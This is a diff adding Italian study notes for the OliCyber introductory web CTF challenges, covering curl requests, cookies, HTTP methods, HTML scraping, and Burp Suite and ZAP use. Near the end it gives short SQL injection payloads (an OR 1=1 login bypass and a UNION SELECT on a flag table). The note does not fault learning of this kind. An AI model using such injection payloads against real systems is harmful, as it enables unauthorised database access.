@@ -1,0 +1,138 @@
+Apri il terminale compa'
+
+1)Web 01 - HTTP: una semplice richiesta
+->curl indirizzoWeb
+
+2)Web 02 - HTTP: richiesta GET con query string
+-> curl "indirizzoWeb?id=flag"
+
+3)Web 03 - HTTP: richiesta GET con header manuale
+->curl -H "X-Password: admin" indirizzoWeb
+
+      [-H "Nome-Header: Valore"]
+
+[-H indica header. Serve a passare al server un'intestazione specifica che il tuo browser o
+curl normalmente non invierebbero, o che vuoi modificare manualmente]
+
+4)Web 04 - HTTP: l'header Accept
+->curl -H "Accept: application/xml" indirizzoWeb
+
+5)Web 05 - HTTP: cookie manuale
+->curl -b "password=admin" indirizzoWeb
+
+[-b sta per "cookie biscuit" o "cookie body"]
+
+6)Web 06 - HTTP: ricevere un cookie
+->curl -c cookies.txt indirizzoWeb/token
+->curl -b cookies.txt indirizzoWeb/flag
+
+{TOKEN E FLAG SONO STATI MESSI PER FAR CAPIRE!!! BISOGNA RINOMINARE INDIRIZZOWEB/TOKEN!}
+
+[La flag -c sta per "cookie-jar", ovvero dove scrivere i cookie ricevuti
+ La flag -b legge i cookie dal file e li invia al server]
+
+7)Web 07 - HTTP: il metodo HEAD
+-> curl -I indirizzoWeb
+
+[La flag -I istruisce curl a fare proprio una richiesta head]
+
+8)Web 08 - HTTP: una richiesta post tradizionale
+->curl -X POST indirizzoWeb \
+  -d "username=admin" \
+  -d "password=admin"
+
+{ALTERNATIVAMENTE:}
+->curl -d "username=admin&password=admin" indirizzoWeb
+
+[-X POST: specifica esplicitamente il metodo HTTP da usare
+ -d: questo flag invia i dati nel corpo della richiesta. Che di default, curl aggiunge
+ l'header "Content-Type: application/x-www-form-urlencoded
+ -d ]
+
+ [Nel secondo caso, scrivo direttamente "-d" siccome in automatico innesca tre comportamenti:
+ 1. Cambio metodo: imposta il metodo HTTP a POST;
+ 2. Header Content-Type: viene aggiunto automaticamente l'header;
+ 3. Corpo della richiesta: dopo "-d" viene inserito nel body del pacchetto HTTP]
+
+ 9)Web 09 - HTTP: una richiesta POST con body JSON
+ ->curl -X POST indirizzoWeb \
+   -H "Content-Type: application/json" \
+   -d '{"username": "admin", "password": "admin"}'
+
+[-H "Content-Type: application/json": Senza questo header, il server potrebbe provare a
+ interpretare le parentesi graffe come se fossero una stringa;
+ -d '...': uso i singoli apici all'esterno e i doppi apici all'interno perche' JSON richiede
+ rigorosamente i doppi apici per le chiavi e per le stringhe]
+
+10)Web 10 - HTTP: il metodo OPTIONS
+-> curl -I -X OPTIONS indirizzoWeb
+-> curl -I -X PUT indirizzoWeb
+
+[Vedi cosa ti esce, se sta un metodo strano a posto di option scrivi quel metodo. Altrimenti:
+ prova sia con PUT sia con PATCH a posto di options. PUO' ESSERE CJE SE FACESSO OPTIONS NON MI
+ USCIREBBE IL METODO PUT O PATCH, TU FORZA LO STESSO. SCRIVI VEDI CHE SUCCEDE.]
+
+11)Web 11 - HTTP: i token CSRF
+->python Challenges/Introduction/Web\ Security/solve_web11.py
+
+12)Web 12 - Tecnologie web: estrarre semplici contenuti da una pagina web
+->curl -s http://web-12.challs.olicyber.it/ | grep -oE "flag\{.*\}"
+
+  [Praticamente | dice che prende l'output di cio che sta prima e lo trasforma in input per la seconda parte; grep è
+  il filtro: -o sarebbe Only-Matching e -E sarebbe Extended Regexp che ti permette di usare i caratteri speciali.
+  Poi "flag" dice che deve cercare testuale, poi .* praticamente prende tutto da li in poi fino a quando non trova
+  la prentesi graffa di chiusura \}]
+
+13)Web 13 - Tecnologie web: estrarre elementi da una pagina web
+->curl -s http://web-13.challs.olicyber.it/ | grep -C 2 "span"
+
+# Sostituisci 'span.red' con quello che hai trovato nello Step 1
+ [Praticamente leggi il codice html e leggi la classe di span]
+->CONTENT=$(curl -s http://web-13.challs.olicyber.it/ | pup 'span.red text{}' | tr -d '\n')
+echo "flag{$CONTENT}"
+
+14)Web 14 - Tecnologie web: estrarre commenti da una pagina web
+->curl -s http://web-14.challs.olicyber.it/ | less
+->/flag
+[una volta che usi less, scrivi /flag che praticamente ti cerca tutta sta parola senza che stai a leggere ogni volta]
+
+15)Web 15 - Tecnologie web: risorse esterne
+Use Burp Suite!
+->Apri Burp Suite e avvia il browser integrato (Proxy -> Browser -> Open Browser).
+->Naviga all'URL della sfida: http://web-15.challs.olicyber.it/
+
+->Spostati nella tab Target -> Site Map.
+Sulla sinistra vedrai l'albero delle directory del sito. Burp organizza ordinatamente tutti i file individuati.
+Puoi cliccare su ogni file (style.css, script.js, ecc.) e vedere il loro contenuto nel pannello di destra.
+
+->Vai nella tab Proxy -> HTTP history.
+->Usa il filtro in alto (clicca sulla barra dei filtri)
+->Cerca la stringa flag
+
+16)Web 16 - Tecnologie web: un semplice spider
+->yay -S zaproxy
+->zaproxy &
+
+  [All'avvio ti apparirà una finestra che ti chiede "Do you want to persist the ZAP Session?".
+  Per le sfide CTF veloci come questa, seleziona "No, I do not want to persist this session at this moment" e 
+  clicca su Start.]
+
+->Una volta dentro, ti troverai nella schermata Quick Start (Avvio Rapido).
+->Clicca sul grande pulsante Automated Scan (Scansione Automatica).
+->Nel campo "URL to attack", incolla l'indirizzo della sfida
+->Lascia le impostazioni di default (Traditional spider) e clicca sul pulsante Attack!
+
+->Cerca la tab Search (Ricerca) in basso, accanto alla History. (Se non c'è, vai nel menu in alto View -> Show Tab -> Search).
+->Scrivi flag{ nella casella di ricerca e premi Invio.
+
+17)Web 17 - SQLi 1: logic SQL injection
+->foo' OR 1=1 -- -
+
+18)Web 18 - SQLi 2: UNION based SQL injection
+->' UNION SELECT flag, 2, 3, 4, 5, 6 FROM real_data -- -
+
+19)Web 19 - SQLi 3: blind SQL injection
+-> python Path/solve_web19.py
+
+20)Web 20 - SQLi 4: time-based SQL injection
+-> python path/solve_web20py
